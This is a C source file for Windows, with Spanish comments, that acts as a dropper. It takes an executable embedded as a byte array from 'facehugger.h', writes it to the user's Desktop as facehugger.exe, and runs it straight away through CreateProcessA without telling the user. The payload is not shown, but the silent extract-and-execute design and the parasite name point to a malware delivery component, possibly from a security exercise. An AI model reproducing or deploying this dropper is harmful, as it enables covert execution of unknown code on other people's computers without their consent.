#include <stdlib.h>
#include <windows.h>
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "facehugger.h"

int get_desktop_path(char *, size_t , const char *);
int extract_and_run_on_desktop(const unsigned char *, size_t , const char *);

int main(){
    const char *outname = "facehugger.exe"; // nombre en el escritorio
    int rc = extract_and_run_on_desktop(facehugger_exe,facehugger_exe_len, outname);
    return 0;
}

//Funcion que intenta obtener la ruta absoluta al escritorio del usuario
//@param *outbuf: Array con el codigo de facehugger
//@param bufsize: Tamaño del arreglo de codigo
//@param outname: Nombre final del ejecutable en el escritorio
//@return 1: Salida por error de nombre de archivo o que no se encontro facehugger
//@return 0: El path se obtuvo sin errores
int get_desktop_path(char *outbuf, size_t bufsize, const char *filename) {
    if (!outbuf || !filename) return 1;
    const char *user = getenv("USERPROFILE");
    if (!user) return 1;
    // USERPROFILE + "\\Desktop\\" + filename
    if (snprintf(outbuf, bufsize, "%s\\Desktop\\%s", user, filename) >= (int)bufsize) return 1;
    return 0;
}

//Funcion que extrae y ejecuta un facehugger en el escritorio
//@param *payload: Array con el codigo de facehugger
//@param payload_len: Tamaño del arreglo de codigo
//@param *filename: Nombre final del ejecutable
//@return 1: Salida con errores
//@return 0: Salida sin errores. Facehugger se ejecuta con exito en el escritorio.
int extract_and_run_on_desktop(const unsigned char *payload, size_t payload_len, const char *filename) {
    if (!payload || payload_len == 0 || !filename) return 1;

    char path[4096];
    if (get_desktop_path(path, sizeof(path), filename) != 0) return 1;

    FILE *f = fopen(path, "wb");
    if (!f) return 1;
    size_t written = fwrite(payload, 1, payload_len, f);
    fclose(f);
    if (written != payload_len) return 1;

    // Intentar ejecutar el archivo creado; si falla, retornamos 1.
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    char cmdline[4096];
    if (snprintf(cmdline, sizeof(cmdline), "\"%s\"", path) >= (int)sizeof(cmdline)) return 1;
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return 1;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}